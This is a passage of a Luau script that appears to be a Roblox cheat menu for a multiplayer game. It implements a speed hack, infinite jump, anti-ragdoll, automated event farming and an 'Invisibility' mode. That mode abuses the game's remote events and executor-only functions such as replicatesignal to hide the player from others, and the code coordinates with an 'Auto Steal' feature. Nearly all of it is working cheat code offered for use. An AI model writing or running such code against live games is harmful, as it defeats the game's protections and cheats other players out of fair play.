						BackgroundTransparency = 0.1,
						StrokeThickness = 0.06,
						StrokeTransparency = 0,
						Visible = false,
					})

					applyScrambledState.Ui.Title = canvasBuilder:Text({
						Parent = applyScrambledState.Ui.Card,
						X = 3.7,
						Y = 0.32,
						Width = 1,
						Height = 1.05,
						Scale = 1.16,
						Wrap = false,
						Text = applyScrambledState.Status,
						Color = scrambledUiColors.idle,
						TextStrokeTransparency = 1,
					})

					applyScrambledState.Ui.Egg = canvasBuilder:Text({
						Parent = applyScrambledState.Ui.Card,
						X = 3.7,
						Y = 1.42,
						Width = 1,
						Height = 1,
						Scale = 1,
						Wrap = false,
						Text = applyScrambledState.Detail,
						Color = "#FFFFFF",
						TextStrokeTransparency = 1,
					})

					applyScrambledState.Ui.Meta = canvasBuilder:Text({
						Parent = applyScrambledState.Ui.Card,
						X = 3.7,
						Y = 2.42,
						Width = 1,
						Height = 0.9,
						Scale = 0.86,
						Wrap = false,
						Text = "Charges 0  Eggs 0/0  Tries 0  Applied 0",
						Color = "#AEB4C6",
						TextStrokeTransparency = 1,
					})

					updateApplyScrambledUi()
				end,
			})

			trackCleanup(function()
				pcall(function()
					scrambledStatusCanvas:Destroy()
				end)
			end)
		else
			applyScrambledState.Row = scrambleSection:CreateText({ Name = "Scrambled Status", Text = "Idle", SubOf = applyScrambledState.Handle })
		end

		scrambleSection:CreateDropdown({
			Name = "Mutation Min Rarity",
			Note = "Only eggs of this rarity and above are used",
			Options = filterRarities,
			Default = filterRarities[1],
			SubOf = applyScrambledState.Handle,
			Callback = function(selectedRarity)
				applyScrambledState.MinRarity = rarityValues[selectedRarity] or 0
			end,
		})

		local incomeMultipliers = {
			["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
			["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
			["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
		}

		local scrambledMinIncomeState = { Slider = nil, Value = 0, Unit = "M/s" }

		local function updateScrambledMinIncome(val, unit)
			if val ~= nil then
				scrambledMinIncomeState.Value = math.max(0, math.floor(tonumber(val) or scrambledMinIncomeState.Value))
			end

			if unit ~= nil then
				scrambledMinIncomeState.Unit = tostring(unit)
			end

			applyScrambledState.MinIncome = scrambledMinIncomeState.Value * (incomeMultipliers[scrambledMinIncomeState.Unit] or incomeMultipliers["M/s"]).Mult
		end

		scrambledMinIncomeState.Slider = formatNumberSuffix(scrambleSection, {
			Name = "Min Mutation Value",
			Note = "Skip eggs worth less than this (0 = off)",
			SubOf = applyScrambledState.Handle,
			Legacy = "Mutation Min Value",
			SectionName = "Dr Scramble Event",
			OnRaw = function(rawIncomeValue)
				updateScrambledMinIncome(math.floor(rawIncomeValue / 1000), "K/s")
			end,
		})

		scrambleSection:CreateDropdown({
			Name = "Mutation Priority",
			Note = "Which egg gets the consumable first",
			Options = eggSortPriorities,
			Default = eggSortPriorities[1],
			SubOf = applyScrambledState.Handle,
			Callback = function(selectedPriority)
				applyScrambledState.Priority = tostring(selectedPriority)
			end,
		})

		hookDropdownAllLabel(scrambleSection:CreateMultiDropdown({
			Name = "Mutation Target Eggs",
			Note = "Only use the consumable on these eggs (empty = all)",
			Options = applyScrambledState.EggOptions,
			Default = {},
			SubOf = applyScrambledState.Handle,
			Callback = function(selectedOptionsTable)
				local targets = {}

				if type(selectedOptionsTable) == "table" then
					for optionKey, optionVal in pairs(selectedOptionsTable) do
						optionKey = optionVal == true and type(optionKey) == "string" and optionKey or type(optionVal) == "string" and optionVal
						local optionName = optionKey or nil

						if optionName and applyScrambledState.EggCategory[optionName] then
							targets[applyScrambledState.EggCategory[optionName]] = true
						end
					end
				end

				applyScrambledState.Targets = targets
			end,
		}))

		applyScrambledState.BuyHandle = scrambleSection:CreateToggle({
			Name = "Auto Buy Scrambled",
			Note = "Buy another Scrambled from the event shop when you run out",
			Default = false,
			SubOf = applyScrambledState.Handle,
			Callback = function()
				applyScrambledState.Cooldown = 0
			end,
		})

		trackCleanup(function()
			applyScrambledState.Loop = applyScrambledState.Loop + 1
			chilliState.Movement.MutationWanted = false
			chilliState.ReleaseMovement("mutation")
		end)
	end

	do
		local invisResumeTime = nil
		local wasScrambleActive = false
		local isFetchingScrambleState = false
		local scrambleStatusParagraph = scramblePartTarget
		local scramblePartsParagraph = nil

		taskScheduler.Add(function()
			if not isFetchingScrambleState and os.clock() - scrambleSnapshotTime >= scrambleActionCooldown then
				isFetchingScrambleState = true

				task.spawn(function()
					pcall(getScrambleState, true)
					isFetchingScrambleState = false
				end)
			end

			local hasStatusSet = nil

			if scrambleStatusParagraph then
				hasStatusSet = type(scrambleStatusParagraph.Set) == "function"
			end

			if hasStatusSet then
				pcall(scrambleStatusParagraph.Set, nil, getScrambleStatusText())
			end

			local hasPartsSet = nil

			if scramblePartsParagraph then
				hasPartsSet = type(scramblePartsParagraph.Set) == "function"
			end

			if hasPartsSet then
				pcall(scramblePartsParagraph.Set, nil, getScramblePartsStatus())
			end

			local isScrambleActive = isScrambleWindowActive()
			local isNightTime = chilliState.IsNight()

			if isScrambleActive and not wasScrambleActive then
				scrambleHoldState.Latch = isNightTime
				scrambleHoldState.Ended = false
			end

			if not isNightTime then
				scrambleHoldState.Latch = false
			elseif isScrambleActive and not scrambleHoldState.Latch and not scrambleHoldState.Ended then
				scrambleHoldState.Ended = true
				scrambleStatusStr = "Night arrived, this outbreak is over"
				table.clear(scrambleWantedRewards)
				table.clear(scrambleClaimedParts)
			end

			if not isScrambleActive then
				scrambleHoldState.Ended = false
			end

			if wasScrambleActive and not isScrambleActive then
				task.delay(15, function()
					if not isScrambleWindowActive() then
						table.clear(scrambleWantedRewards)
						table.clear(scrambleDroneCooldowns)
					end
				end)
			end

			wasScrambleActive = isScrambleActive

			if chilliState.Toggle(nil, false) and not scrambleHasStarted and os.clock() >= scrambleTrySpawn and isScrambleEventActive() then
				scrambleHasStarted = true
				scrambleTrySpawn = os.clock() + 8

				task.spawn(function()
					pcall(buyScrambleShopItems, function()
						return not chilliState.Toggle(nil, false)
					end)

					scrambleHasStarted = false
				end)
			end

			local isDroneHuntWanted = isScrambleDroneHuntActive()
			local isPartsWanted = isScrambleCollectLostPartsActive()
			chilliState.Movement.ScrambleWanted = isDroneHuntWanted or isPartsWanted
			local invisibilityHandle = chilliState.InvisibilityHandle
			local hasInvis = invisibilityHandle ~= nil and chilliState.Toggle(invisibilityHandle, false)

			if isDroneHuntWanted then
				invisResumeTime = nil

				if not chilliState.InvisSuspended then
					chilliState.InvisSuspended = true
					hasInvis = hasInvis and type(chilliLib.Notify) == "function"

					if hasInvis then
						pcall(chilliLib.Notify, "Invisibility", "Invisibility is paused for the drone hunt and comes back after it.", 5)
					end
				end
			elseif chilliState.InvisSuspended and not isScrambleTaskRunning then
				invisResumeTime = invisResumeTime or os.clock() + 5

				if os.clock() >= invisResumeTime then
					invisResumeTime = nil
					chilliState.InvisSuspended = false

					if hasInvis and type(chilliLib.Notify) == "function" then
						pcall(chilliLib.Notify, "Invisibility", "The drone hunt is over, Invisibility is back on.", 5)
					end
				end
			end

			local character = localPlayer.Character
			if isDroneHuntWanted and not isScrambleTaskRunning and character and character:GetAttribute("InvisApplied") == true then
				scrambleStatusStr = "Leaving Invisibility for the hunt"
				return true
			end

			if isScrambleTaskRunning then
				return isDroneHuntWanted
			end

			if not (isDroneHuntWanted or isPartsWanted) or os.clock() < scrambleNextCheck then
				if not isDroneHuntWanted and not isPartsWanted then
					scrambleStatusStr = ""
				end

				return false
			end

			local steal = chilliState.Steal
			if steal.Active or steal.Carrying or steal.Wanted then
				scrambleStatusStr = "Auto Steal goes first"
				return isDroneHuntWanted
			end

			if not chilliState.ClaimMovement("scramble") then
				scrambleStatusStr = "Waiting for " .. tostring(chilliState.Movement.Owner or "movement") .. " to finish"
				return isDroneHuntWanted
			end
			isScrambleTaskRunning = true
			scrambleNextCheck = os.clock() + scrambleCheckCooldown
			local currentTaskInstance = scrambleNextAction

			task.spawn(function()
				pcall(leaveTreadmillForScramble, function()
					return currentTaskInstance ~= scrambleNextAction
				end)

				chilliState.HoldBelt()
				pcall(runScrambleAutomationLoop, currentTaskInstance)
				scrambleMoveStop()
				chilliState.ReleaseBelt()
				chilliState.ReleaseMovement("scramble")
				isScrambleTaskRunning = false
				taskScheduler.Wake()
			end)

			return isDroneHuntWanted
		end)
	end

	trackCleanup(function()
		scrambleNextAction += 1
		scrambleMoveStop()
		chilliState.InvisSuspended = false
		chilliState.Movement.ScrambleWanted = false
		chilliState.ReleaseMovement("scramble")
	end)

	local characterSection, combatSection

	do
		-- ══════════════════════════════════════════════════════════════════════════
		-- 🏃 [SECTION 2] PLAYER TAB - ESP, MOVEMENT, CHARACTER & COMBAT
		-- ══════════════════════════════════════════════════════════════════════════
		local playerTab = hubWindow:CreateTab({ Name = "Player", SectionsExpanded = true })
		chilliState.EspSection = playerTab:CreateSection({ Name = "ESP", Expanded = false })
		local movementSection = playerTab:CreateSection({ Name = "Movement", Expanded = true })
		characterSection = playerTab:CreateSection({ Name = "Character", Expanded = true })
		combatSection = playerTab:CreateSection({ Name = "Combat", Expanded = true })
		local createToggle = nil
		local walkSpeedOverride = 350
		local speedConnection = nil
		local isSpeedForcedActive = false

		local function getRootAndHumanoid()
			local character = localPlayer.Character
			local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")
			if humanoidRootPart and humanoid and humanoid.Health > 0 then
				return humanoidRootPart, humanoid
			end
			return nil, nil
		end

		local function clearSpeedOverride()
			if not isSpeedForcedActive then
				return
			end
			isSpeedForcedActive = false
			local rootPart, humanoid = getRootAndHumanoid()
			if not rootPart then
				return
			end
			local assemblyLinearVelocity = rootPart.AssemblyLinearVelocity
			local moveDirection = humanoid.MoveDirection
			local vector = Vector3.new(moveDirection.X, 0, moveDirection.Z)
			local vector2 = vector.Magnitude > 0.001 and vector.Unit * humanoid.WalkSpeed or Vector3.zero

			pcall(function()
				rootPart.AssemblyLinearVelocity = Vector3.new(vector2.X, assemblyLinearVelocity.Y, vector2.Z)
			end)
		end

		local function stopSpeedHack()
			if speedConnection then
				speedConnection:Disconnect()
				speedConnection = nil
			end

			clearSpeedOverride()
			chilliState.Shield("speed", false)
		end

		local function startSpeedHack()
			if speedConnection then
				return
			end
			chilliState.Shield("speed", true)

			speedConnection = RunService.Heartbeat:Connect(function()
				if chilliState.Steal.Active or chilliState.Flying or chilliState.Driving > 0 or chilliState.Treadmill.Riding then
					isSpeedForcedActive = false
					return
				end
				local rootPart, humanoid = getRootAndHumanoid()
				if not rootPart or humanoid.Sit or humanoid.PlatformStand then
					isSpeedForcedActive = false
					return
				end
				local ragdollTime = tonumber(localPlayer:GetAttribute("RagdollEndTime"))
				if ragdollTime and ragdollTime > workspace:GetServerTimeNow() then
					isSpeedForcedActive = false
					return
				end
				local moveDirection = humanoid.MoveDirection
				local vector = Vector3.new(moveDirection.X, 0, moveDirection.Z)
				if vector.Magnitude <= 0.001 then
					clearSpeedOverride()
					return
				end
				local velocityOverride = vector.Unit * walkSpeedOverride
				local assemblyLinearVelocity = rootPart.AssemblyLinearVelocity

				pcall(function()
					rootPart.AssemblyLinearVelocity = Vector3.new(velocityOverride.X, assemblyLinearVelocity.Y, velocityOverride.Z)
				end)

				isSpeedForcedActive = true
			end)
		end

		chilliState.SpeedForced = false

		local function updateSpeedHack()
			if chilliState.Toggle(createToggle, false) or chilliState.SpeedForced then
				startSpeedHack()
			else
				stopSpeedHack()
			end
		end

		local hasSpeedStateChanged = false
		local wasSpeedBoostForcedOn = false
		local speedBoostDisabledWhileInvisWarning = false

		chilliState.SetSpeedForced = function(arg)
			chilliState.SpeedForced = arg == true
			hasSpeedStateChanged = true
			updateSpeedHack()
		end

		local speedBoostToggleOptions = {
			Name = "Speed Boost",
			Default = false,
			Callback = function()
				if chilliState.SpeedForced and not chilliState.Toggle(createToggle, false) then
					hasSpeedStateChanged = true
					speedBoostDisabledWhileInvisWarning = true
				end

				updateSpeedHack()
			end,
		}

		createToggle = movementSection.CreateToggle
		createToggle = createToggle(movementSection, speedBoostToggleOptions)

		local speedSyncConnection = RunService.Heartbeat:Connect(function()
			if speedBoostDisabledWhileInvisWarning then
				speedBoostDisabledWhileInvisWarning = false

				if type(chilliLib.Notify) == "function" then
					pcall(chilliLib.Notify, "Speed Boost", "Speed Boost must stay on while Invisibility is on.", 5)
				end
			end

			if not hasSpeedStateChanged then
				return
			end
			hasSpeedStateChanged = false
			local speedToggleState

			if chilliState.SpeedForced and not chilliState.Toggle(createToggle, false) then
				wasSpeedBoostForcedOn = true
				speedToggleState = true
			else
				local shouldRevertSpeed = not chilliState.SpeedForced and wasSpeedBoostForcedOn
				speedToggleState = nil

				if shouldRevertSpeed then
					wasSpeedBoostForcedOn = false
					speedToggleState = nil

					if chilliState.Toggle(createToggle, false) then
						speedToggleState = false
					end
				end
			end

			if speedToggleState ~= nil then
				for _, methodName in ipairs({ "Set", "SetValue" }) do
					local ok, result = pcall(function()
						return createToggle[methodName]
					end)

					if not (ok and type(result) == "function" and pcall(result, createToggle, speedToggleState)) then
						continue
					end
					break
				end
			end
		end)

		trackCleanup(function()
			speedSyncConnection:Disconnect()
		end)

		movementSection:CreateSlider({
			Name = "Boost Speed",
			Min = 20,
			Max = 1000,
			Default = 350,
			Increment = 5,
			Unit = "studs/s",
			Callback = function(arg)
				walkSpeedOverride = math.clamp(tonumber(arg) or 350, 20, 1000)
			end,
		})

		trackCleanup(stopSpeedHack)
		local infiniteJumpToggleHandle = nil
		local infiniteJumpConnection = nil

		local function stopInfiniteJump()
			if infiniteJumpConnection then
				infiniteJumpConnection:Disconnect()
				infiniteJumpConnection = nil
			end

			chilliState.Shield("jump", false)
		end

		infiniteJumpToggleHandle = movementSection:CreateToggle({
			Name = "Infinite Jump",
			Default = false,
			Callback = function()
				if not chilliState.Toggle(infiniteJumpToggleHandle, false) then
					stopInfiniteJump()
					return
				end

				if infiniteJumpConnection then
					return
				end
				chilliState.Shield("jump", true)

				infiniteJumpConnection = UserInputService.JumpRequest:Connect(function()
					local character = localPlayer.Character
					local humanoid = character and character:FindFirstChildOfClass("Humanoid")

					if humanoid then
						pcall(function()
							humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
						end)
					end
				end)
			end,
		})

		trackCleanup(stopInfiniteJump)
	end

	do
		local invisToggleHandle = nil
		local isInvisEnabled = false
		local isInvisReady = true
		local wasInvisActive = false
		local isRagdolling = false
		local isCheckingInvis = false
		local invisConnection = nil
		local invisCheckConnection = nil
		local hipHeight = 999

		local function shouldBeInvisible()
			return isInvisEnabled and not chilliState.InvisSuspended and not chilliState.InvisMech
		end

		local function getHumanoid(characterObj)
			return characterObj and characterObj:FindFirstChildOfClass("Humanoid") or nil
		end

		local function getNetworkEndpoint(pathStr)
			return networking:FindFirstChild(pathStr)
		end

		local function isInvisibilityApplied(characterObj)
			return characterObj ~= nil and characterObj:GetAttribute("InvisApplied") == true
		end

		local function dismountTreadmillForInvis()
			local AskDoff = getNetworkEndpoint("RF/Treadmill/AskDoff")

			if AskDoff and AskDoff:IsA("RemoteFunction") then
				for i = 1, 2 do
					pcall(AskDoff.InvokeServer, AskDoff)
				end
			end
		end

		local function wipeRigForInvis(characterObj)
			local AskRigWipe = getNetworkEndpoint("RE/RigSync/AskRigWipe")

			if AskRigWipe and AskRigWipe:IsA("RemoteEvent") then
				pcall(AskRigWipe.FireServer, AskRigWipe, characterObj)
			end
		end

		local function unequipToolsForInvis(characterObj)
			local backpack = localPlayer:FindFirstChildOfClass("Backpack")

			for _, child in ipairs(characterObj:GetChildren()) do
				if child:IsA("Humanoid") then
					pcall(child.UnequipTools, child)
				end
			end

			if backpack then
				for _, child in ipairs(characterObj:GetChildren()) do
					if child:IsA("Tool") then
						pcall(function()
							child.Parent = backpack
						end)
					end
				end
			end

			for i = 1, 3 do
				RunService.Heartbeat:Wait()
			end
		end

		local function killCharacterForInvis(characterObj)
			local humanoid = getHumanoid(characterObj)
			if not characterObj or not humanoid then
				return false
			end
			unequipToolsForInvis(characterObj)
			dismountTreadmillForInvis()

			pcall(function()
				humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
				humanoid.BreakJointsOnDeath = true
				humanoid.RequiresNeck = true
				humanoid.Health = 0
			end)

			pcall(function()
				humanoid:ChangeState(Enum.HumanoidStateType.Dead)
			end)

			pcall(function()
				characterObj:BreakJoints()
			end)

			wipeRigForInvis(characterObj)
			return true
		end

		local function setupInvisibleCharacter(characterObj)
			local humanoid = getHumanoid(characterObj)
			local timeoutTime = os.clock() + 10

			while true do
				if os.clock() < timeoutTime and isInvisReady and characterObj.Parent then
					humanoid = humanoid or getHumanoid(characterObj)
					if not (humanoid and characterObj:FindFirstChild("HumanoidRootPart") and characterObj:FindFirstChild("Head")) then
						task.wait()
						continue
					end
				end

				break
			end

			local humanoidRootPart = characterObj:FindFirstChild("HumanoidRootPart")
			if not shouldBeInvisible() or not humanoid or not humanoidRootPart or not characterObj:FindFirstChild("Head") then
				return false
			end
			task.wait(0.05)
			if not shouldBeInvisible() or characterObj.Parent == nil then
				return false
			end

			for i = 1, 2 do
				pcall(humanoid.UnequipTools, humanoid)
			end

			if type(replicatesignal) == "function" then
				for i = 1, 2 do
					pcall(replicatesignal, humanoid.ServerBreakJoints)
				end
			end

			local originalHipHeight = humanoid.HipHeight

			pcall(function()
				humanoid.HipHeight = hipHeight
			end)

			for _, child in ipairs(characterObj:GetChildren()) do
				if child:IsA("Accessory") or child:IsA("BasePart") and child ~= humanoidRootPart then
					pcall(function()
						child.Parent = nil
					end)
				end
			end

			task.wait(0.12)

			local function resetHipHeight()
				pcall(function()
					humanoid.HipHeight = originalHipHeight
				end)

				for _, child in ipairs(characterObj:GetChildren()) do
					if child:IsA("Humanoid") and child.HipHeight ~= originalHipHeight then
						pcall(function()
							child.HipHeight = originalHipHeight
						end)
					end
				end
			end

			if characterObj.Parent == nil then
				resetHipHeight()
				return false
			end
			local motor6D = Instance.new("Motor6D")
			motor6D.Name = "RightWrist"
			motor6D.C0 = CFrame.new(1.2, 0, 0)
			motor6D.C1 = CFrame.new()
			motor6D.Part0 = humanoidRootPart
			motor6D.Parent = humanoidRootPart
			local part = Instance.new("Part")
			part.Name = "RightHand"
			part.Size = Vector3.new(0.2, 0.2, 0.2)
			part.Transparency = 1
			part.CanCollide = false
			part.CanTouch = false
			part.CanQuery = false
			part.Massless = true
			part.CFrame = humanoidRootPart.CFrame * motor6D.C0
			motor6D.Part1 = part
			part.Parent = characterObj

			pcall(function()
				humanoidRootPart.CanCollide = false
			end)

			resetHipHeight()
			characterObj:SetAttribute("InvisApplied", true)

			task.delay(1, function()
				local chilliToolKeeper = (typeof(getgenv) == "function" and getgenv() or _G).ChilliToolKeeper

				if characterObj.Parent and type(chilliToolKeeper) == "function" then
					pcall(chilliToolKeeper)
				end
			end)

			task.delay(0.2, function()
				if humanoidRootPart.Parent then
					pcall(function()
						humanoidRootPart.CanCollide = true
					end)
				end
			end)

			local connection = characterObj.ChildAdded:Connect(function(child)
				if child:IsA("Humanoid") then
					task.defer(function()
						if child.HipHeight ~= originalHipHeight then
							pcall(function()
								child.HipHeight = originalHipHeight
							end)
						end
					end)
				end
			end)

			local connection2 = nil

			connection2 = characterObj.AncestryChanged:Connect(function(child, parent2)
				if parent2 == nil then
					connection:Disconnect()
					connection2:Disconnect()
				end
			end)

			return true
		end

		local function isInvisBusy()
			local active = chilliState.Steal.Active or chilliState.Steal.Carrying or chilliState.Flying

			if not active then
				active = (chilliState.Driving or 0) > 0
			end

			return active
		end

		chilliState.RequestRespawn = function()
			isCheckingInvis = true
		end

		local function processInvisibilityRespawn()
			wasInvisActive = true
			local shouldForceRespawn = isCheckingInvis

			while true do
				local busy = isInvisReady

				if isInvisReady then
					busy = isInvisBusy() or not chilliState.ClaimMovement("invisibility")
				end

				if busy then
					task.wait(0.2)
					continue
				end
				break
			end

			local character = localPlayer.Character

			if isInvisReady and character and (shouldForceRespawn or isInvisibilityApplied(character) ~= shouldBeInvisible()) and getHumanoid(character) then
				isCheckingInvis = false
				scrambleState.Paused = true
				chilliState.ShieldPaused = true
				pcall(chilliState.UndoSwap)
				task.wait()
				killCharacterForInvis(localPlayer.Character)
				local maxWaitTime = os.clock() + 60
				local rigWipeTime = os.clock() + 8

				while isInvisReady and os.clock() < maxWaitTime and localPlayer.Character == character do
					if rigWipeTime <= os.clock() then
						rigWipeTime = os.clock() + 8
						wipeRigForInvis(character)
					end

					task.wait(0.05)
				end

				task.wait(0.1)

				while isInvisReady and isRagdolling do
					task.wait(0.05)
				end
			end

			scrambleState.Paused = false
			chilliState.ShieldPaused = false
			chilliState.ReleaseMovement("invisibility")
			wasInvisActive = false
		end

		local invisCharacterAddedConn = localPlayer.CharacterAdded:Connect(function(character)
			if not shouldBeInvisible() then
				return
			end
			isRagdolling = true
			chilliState.ShieldPaused = true

			task.spawn(function()
				pcall(setupInvisibleCharacter, character)
				isRagdolling = false

				if not wasInvisActive then
					chilliState.ShieldPaused = false
				end
			end)
		end)

		local invisCheckThread = task.spawn(function()
			while isInvisReady do
				local character = localPlayer.Character
				local humanoid = getHumanoid(character)

				if not wasInvisActive and not isRagdolling and character and humanoid and humanoid.Health > 0 and (isCheckingInvis or isInvisibilityApplied(character) ~= shouldBeInvisible()) then
					processInvisibilityRespawn()
				end

				local currentInvisState = isInvisibilityApplied(localPlayer.Character)

				if currentInvisState ~= invisConnection then
					invisConnection = currentInvisState
					chilliState.SetSpeedForced(currentInvisState)
				end

				task.wait(0.25)
			end
		end)

		local invisToolFixConn = RunService.Heartbeat:Connect(function()
			local character = localPlayer.Character
			if not character or not isInvisibilityApplied(character) then
				return
			end
			local rightHand = character:FindFirstChild("RightHand")
			local tool = character:FindFirstChildWhichIsA("Tool")
			local handle = tool and tool:FindFirstChild("Handle")
			if not rightHand or not handle or not handle:IsA("BasePart") then
				return
			end
			local cframe = CFrame.new()

			for _, child in ipairs(rightHand:GetChildren()) do
				if child:IsA("JointInstance") and child.Name == "RightGrip" and child.Part1 == handle then
					cframe = child.C0 * child.C1:Inverse()

					if child.Enabled then
						child.Enabled = false
					end
				end
			end

			pcall(function()
				handle.CFrame = rightHand.CFrame * cframe
				handle.AssemblyLinearVelocity = Vector3.zero
				handle.AssemblyAngularVelocity = Vector3.zero
			end)
		end)

		trackCleanup(function()
			invisToolFixConn:Disconnect()
		end)

		local invisAutoRotateConn = RunService.Heartbeat:Connect(function()
			local character = localPlayer.Character
			local humanoid = getHumanoid(character)
			local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
			if not humanoid or not humanoidRootPart or humanoid.Health <= 0 then
				return
			end
			local shouldFixAutoRotate = isInvisibilityApplied(character) and not chilliState.Steal.Active and not chilliState.Flying

			if shouldFixAutoRotate then
				shouldFixAutoRotate = (chilliState.Driving or 0) == 0
			end

			if shouldFixAutoRotate then
				shouldFixAutoRotate = not (chilliState.Treadmill and chilliState.Treadmill.Riding)
			end

			if not (shouldFixAutoRotate and not humanoid.Sit and not humanoid.PlatformStand) then
				if invisCheckConnection == humanoid then
					invisCheckConnection = nil

					pcall(function()
						humanoid.AutoRotate = true
					end)
				end

				return
			end

			if humanoid.AutoRotate then
				pcall(function()
					humanoid.AutoRotate = false
				end)
			end

			invisCheckConnection = humanoid
			local moveDirection = humanoid.MoveDirection
			local vector = Vector3.new(moveDirection.X, 0, moveDirection.Z)

			if vector.Magnitude > 0.01 then
				pcall(function()
					humanoidRootPart.CFrame = CFrame.lookAt(humanoidRootPart.Position, humanoidRootPart.Position + vector.Unit)
				end)
			end
		end)

		chilliState.InvisibilityHandle = characterSection:CreateToggle({
			Name = "Invisibility",
			Note = "Makes you invisible to other players",
			Default = false,
			Callback = function()
				local blockReason = nil

				if type(chilliState.CombatActive) == "function" and chilliState.CombatActive() then
					blockReason = "Auto Hit"
				end

				if chilliState.Toggle(invisToggleHandle, false) and blockReason then
					isInvisEnabled = false
					local handle = invisToggleHandle

					chilliState.UiDefer(function()
						pcall(handle.Set, handle, false, false)
						chilliState.Notify("Invisibility", "Turn off " .. blockReason .. " first, both cannot be on at the same time")
					end)

					return
				end

				isInvisEnabled = chilliState.Toggle(invisToggleHandle, false) == true

				if shouldBeInvisible() and not isInvisibilityApplied(localPlayer.Character) and chilliState.Movement.Owner == nil then
					chilliState.Movement.Owner = "invisibility"
				end
			end,
		})
		trackCleanup(function()
			isInvisReady = false
			invisCharacterAddedConn:Disconnect()
			invisAutoRotateConn:Disconnect()
			pcall(task.cancel, invisCheckThread)
			scrambleState.Paused = false
			chilliState.ShieldPaused = false
			chilliState.ReleaseMovement("invisibility")
		end)
	end

	do
		local ragdollConstraintClasses = { BallSocketConstraint = true, NoCollisionConstraint = true, HingeConstraint = true }

		local ragdollHumanoidStates = {
			[Enum.HumanoidStateType.Physics] = true,
			[Enum.HumanoidStateType.Ragdoll] = true,
			[Enum.HumanoidStateType.FallingDown] = true,
		}

		local RAGDOLL_RECOVERY_WINDOW = 0.5
		local RAGDOLL_MAX_SPEED_OFFSET = 5
		local RAGDOLL_MAX_Y_VELOCITY = 0

		local RagdollModule = safeRequire(function()
			return ReplicatedStorage.Shared.Modules.Ragdoll
		end)

		local playerControls = nil

		local function getPlayerControls()
			if playerControls then
				return playerControls
			end

			local ok, result = pcall(function()
				return require(localPlayer:WaitForChild("PlayerScripts", 5):WaitForChild("PlayerModule", 5)):GetControls()
			end)

			if ok then
				playerControls = result
			end

			return playerControls
		end

		local antiRagdollToggleHandle = nil
		local isAntiRagdollActive = false
		local antiRagdollConnection = nil
		local recoveryEndTime = 0
		local onCharacterAdded = nil
		local globalConnections = {}
		local characterConnections = {}
		local characterId = 0
		local targetCharacter = nil
		local targetHumanoid = nil

		local function disconnectAll(connectionsList)
			for _, conn in ipairs(connectionsList) do
				if conn.Connected then
					conn:Disconnect()
				end
			end

			table.clear(connectionsList)
		end

		local function addGlobalConnection(conn)
			globalConnections[#globalConnections + 1] = conn
		end

		local function addCharacterConnection(conn)
			characterConnections[#characterConnections + 1] = conn
		end

		local function limitRagdollVelocity()
			if not targetCharacter or not targetHumanoid then
				return
			end
			local humanoidRootPart = targetCharacter:FindFirstChild("HumanoidRootPart")
			if not humanoidRootPart then
				return
			end
			local assemblyLinearVelocity = humanoidRootPart.AssemblyLinearVelocity
			local vector = Vector3.new(assemblyLinearVelocity.X, 0, assemblyLinearVelocity.Z)
			local maxSpeed = targetHumanoid.WalkSpeed + RAGDOLL_MAX_SPEED_OFFSET
			local y = assemblyLinearVelocity.Y
			local isCapped = false

			if maxSpeed < vector.Magnitude then
				vector = vector.Unit * maxSpeed
				isCapped = true
			end

			if y > RAGDOLL_MAX_Y_VELOCITY then
				y = RAGDOLL_MAX_Y_VELOCITY
				isCapped = true
			end

			if isCapped then
				pcall(function()
					humanoidRootPart.AssemblyLinearVelocity = Vector3.new(vector.X, y, vector.Z)
				end)
			end
		end

		local function clearClientRagdoll()
			if type(RagdollModule) ~= "table" then
				return
			end

			if type(RagdollModule.ClearClientRagdoll) == "function" then
				pcall(RagdollModule.ClearClientRagdoll)
			end

			if type(RagdollModule.Unragdoll) == "function" then
				pcall(RagdollModule.Unragdoll, targetCharacter)
			end
		end

		local function destroyRagdollConstraints()
			if not targetCharacter or not targetCharacter.Parent then
				return
			end

			for _, descendant in ipairs(targetCharacter:GetDescendants()) do
				if ragdollConstraintClasses[descendant.ClassName] then
					pcall(function()
						descendant:Destroy()
					end)
				end
			end
		end

		local function enableMotor6Ds()
			if not targetCharacter or not targetCharacter.Parent then
				return
			end

			for _, descendant in ipairs(targetCharacter:GetDescendants()) do
				if descendant:IsA("Motor6D") and not descendant.Enabled then
					pcall(function()
						descendant.Enabled = true
					end)
				elseif descendant:IsA("AnimationConstraint") and not descendant.Enabled then
					pcall(function()
						descendant.Enabled = true
					end)
				end
			end
		end

		local function enablePlayerControls()
			local controls = getPlayerControls()

			if controls and controls.controlsEnabled == false then
				pcall(function()
					controls:Enable()
				end)
			end
		end

		local function resetCameraSubject()
			local currentCamera = workspace.CurrentCamera

			if currentCamera and targetHumanoid and currentCamera.CameraSubject ~= targetHumanoid then
				pcall(function()
					currentCamera.CameraSubject = targetHumanoid
				end)
			end
		end

		local function fixHumanoidState()
			if not targetHumanoid or not targetHumanoid.Parent or targetHumanoid.Health <= 0 then
				return
			end

			if ragdollHumanoidStates[targetHumanoid:GetState()] then
				pcall(function()
					targetHumanoid:ChangeState(Enum.HumanoidStateType.Running)
				end)
			end

			if targetHumanoid.PlatformStand then
				targetHumanoid.PlatformStand = false
			end
		end

		local function isPlayerRagdolled()
			if type(RagdollModule) == "table" and type(RagdollModule.IsRagdolled) == "function" then
				local ok, result = pcall(RagdollModule.IsRagdolled, targetCharacter)
				if ok and result == true then
					return true
				end
			end

			local num = tonumber(localPlayer:GetAttribute("RagdollEndTime"))
			return num ~= nil and num > workspace:GetServerTimeNow()
		end

		local ANTI_GUARD_BUSY_TIMEOUT = 21

		local function isAntiGuardBusy()
			if chilliState.AntiGuard.Busy == true then
				return true
			end

			if (tonumber(chilliState.AntiGuard.HitArms) or 0) <= 0 then
				return false
			end
			return os.clock() - (tonumber(chilliState.AntiGuard.HitArmedAt) or 0) <= ANTI_GUARD_BUSY_TIMEOUT
		end

		local function isHumanoidRagdolled()
			if not targetHumanoid or not targetHumanoid.Parent then
				return false
			end

			if targetHumanoid.PlatformStand then
				return true
			end
			return ragdollHumanoidStates[targetHumanoid:GetState()] == true
		end

		local function hasRagdollConstraints()
			if not targetCharacter or not targetCharacter.Parent then
				return false
			end

			for _, child in ipairs(targetCharacter:GetChildren()) do
				if ragdollConstraintClasses[child.ClassName] then
					return true
